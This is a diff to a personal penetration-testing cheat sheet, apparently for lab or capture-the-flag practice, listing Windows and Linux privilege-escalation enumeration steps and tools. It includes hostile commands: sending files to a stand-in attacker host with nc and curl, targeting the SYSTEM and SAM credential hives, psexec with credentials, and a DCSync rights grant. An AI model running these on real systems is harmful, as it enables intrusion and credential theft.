@@ -74,6 +74,7 @@
 - [Good advices](https://nored0x.github.io/red-teaming/windows-enumeration/)
 - [Good Advices 2](https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842)
 - [Windows enumeration](https://fuzzysecurity.com/tutorials/16.html?ref=172.16.77.130)
+
 - whoami /priv
 - systeminfo
   - architecture 
@@ -102,6 +103,8 @@
 - RCE admin: change user
 - Check files on user:
   -  cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata
+- Credentials
+  - SYSTEM and SAM
   
 - **Automatic scans**
   - winpeas
@@ -110,7 +113,9 @@
   - [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
   - [Peas Family](https://github.com/carlospolop/PEASS-ng/tree/master)
   - Empire modules:  /usr/share/powershell-empire/empire/server/modules/
-  - /usr/share/webshells 
+  - /usr/share/webshell
+  - winpeas
+  - jaws-enum
 
 ### Kerberos
 - Enumerate
@@ -192,7 +197,9 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
 - Online tips:
   - [smb enum](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
 - psexec.py user:pass@$target COMMAND
-- 
+
+- Mount windows smb in windows
+  - mount -t cifs //$target/share /mnt/name
 
 ## Linux
 - sudo -l
@@ -209,6 +216,8 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   - find /etc -type f -exec grep -i -I "pass" {} /dev/null \;
 - Read all files in a folder
   - find /path/target -type f -exec cat {} +
+- Executables
+  - full path / path hijacking
 
 - Virtual hosts?
 - lscpu
@@ -236,6 +245,7 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   
 - Automatic
   - linpeas
+  - linenum
 
 - export PATH=/tmp:$PATH = possible?
 
@@ -321,8 +331,15 @@ New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root\\$IPATTACK
 - curl attacker-machine:8000:file.ext
 
 ### Data extraction
+- NC
   - receiver: nc -nlvt PORT > file
   - sender:   nc ATTACKER_IP PORT < file 
+
+- Base64
+  - target: base64 -w0 file
+  - Copy content
+  - Attacker: base64 -d file
+    - ltrace / strace
 
 ### Other methods
 - Create a shell script that execute the desired command
